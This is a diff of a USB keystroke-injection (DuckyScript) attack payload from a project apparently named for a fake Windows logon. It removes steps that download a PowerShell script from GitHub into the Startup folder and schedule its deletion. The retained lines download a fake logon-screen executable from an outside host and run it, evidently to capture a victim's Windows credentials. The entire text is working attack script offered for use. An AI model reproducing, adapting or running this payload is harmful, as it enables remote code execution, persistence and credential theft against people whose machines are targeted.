@@ -16,25 +16,6 @@ DELAY 1000
 ALT y
 DELAY 800
 
-REM Download upload_2_db.ps1 and save it in the startup folder
-STRING (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/main/upload_2_db.ps1', '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upload_2_db.ps1')
-ENTER
-DELAY 800
-
-REM Create a scheduled task to delete the upload_2_db.ps1 file after startup
-STRING $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c del $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upload_2_db.ps1'
-ENTER
-DELAY 300
-STRING $trigger = New-ScheduledTaskTrigger -AtLogon
-ENTER
-DELAY 300
-STRING $principal = New-ScheduledTaskPrincipal -UserId "BUILTIN\Users" -LogonType Interactive
-ENTER
-DELAY 300
-STRING Register-ScheduledTask -TaskName "RemoveUpload2DbScript" -Action $action -Trigger $trigger -Principal $principal
-ENTER
-DELAY 800
-
 REM Download FakeLogonScreenToFile.exe and run it
 STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/raw/main/FakeLogonScreenToFile.exe', '$env:TEMP\FakeLogonScreenToFile.exe')
 ENTER
